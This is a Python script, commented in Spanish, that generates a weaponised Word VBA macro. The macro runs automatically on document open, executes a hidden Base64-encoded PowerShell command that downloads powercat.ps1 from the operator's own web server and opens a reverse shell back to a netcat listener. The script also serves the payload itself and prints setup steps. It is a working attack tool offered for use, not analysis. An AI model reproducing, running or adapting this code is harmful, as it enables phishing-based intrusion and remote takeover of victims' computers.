import base64
import socket
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

def get_local_ip():
    """Obtiene la IP local de la máquina"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def start_web_server(port=8000):
    """Inicia un servidor web en el directorio actual"""
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    class CustomHandler(SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            print(f"Servidor web - {self.address_string()} - {format % args}")
    
    server = HTTPServer(('0.0.0.0', port), CustomHandler)
    print(f"Servidor web iniciado en http://{get_local_ip()}:{port}")
    print(f"Directorio: {os.getcwd()}")
    
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    return server

def generate_macro(ip, port=8000, lport=4444):
    """Genera la macro VBA con el payload codificado"""
    
    # El comando PowerShell original
    ps_command = f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:{port}/powercat.ps1');powercat -c {ip} -p {lport} -e powershell"
    
    print(f"Comando PowerShell: {ps_command}")
    
    # Codificar a UTF-16LE y luego a Base64
    encoded_bytes = ps_command.encode('utf-16-le')
    base64_encoded = base64.b64encode(encoded_bytes).decode('ascii')
    
    print(f"Longitud Base64: {len(base64_encoded)} caracteres")
    
    # Dividir en líneas de 50 caracteres
    chunk_size = 50
    chunks = [base64_encoded[i:i+chunk_size] for i in range(0, len(base64_encoded), chunk_size)]
    
    # Generar el código VBA
    vba_code = '''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
'''
    
    # Agregar todos los chunks
    for i, chunk in enumerate(chunks):
        if i == 0:
            vba_code += f'    Str = "{chunk}"\n'
        else:
            vba_code += f'    Str = Str + "{chunk}"\n'
    
    vba_code += '\n    CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " + Str\nEnd Sub'
    
    return vba_code

def main():
    print("=== Generador de Macro VBA para Powercat ===\n")
    
    # Obtener IP automáticamente
    local_ip = get_local_ip()
    print(f"IP local detectada: {local_ip}")
    
    # Configurar puertos
    web_port = input(f"Puerto del servidor web [{8000}]: ").strip()
    web_port = int(web_port) if web_port else 8000
    
    lport = input(f"Puerto para la reverse shell [{4444}]: ").strip()
    lport = int(lport) if lport else 4444
    
    # Iniciar servidor web
    print("\nIniciando servidor web...")
    server = start_web_server(web_port)
    
    # Generar macro
    print("\nGenerando macro VBA...")
    vba_code = generate_macro(local_ip, web_port, lport)
    
    # Mostrar la macro completa en pantalla
    print("\n" + "="*60)
    print("MACRO VBA COMPLETA - Copia y pega esto en Word:")
    print("="*60)
    print(vba_code)
    print("="*60)
    
    # También guardar en archivo
    output_file = "macro_powercat.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(vba_code)
    
    print(f"\nTambién guardado en: {output_file}")
    print(f"\nINSTRUCCIONES:")
    print(f"1. powercat.ps1 debe estar en esta carpeta")
    print(f"2. Ejecuta: nc -lvnp {lport} para escuchar")
    print(f"3. Servidor web en puerto {web_port}")
    
    try:
        input("\nPresiona Enter para detener el servidor web...")
    except KeyboardInterrupt:
        pass
    finally:
        server.shutdown()
        print("Servidor web detenido.")

if __name__ == "__main__":
    main()
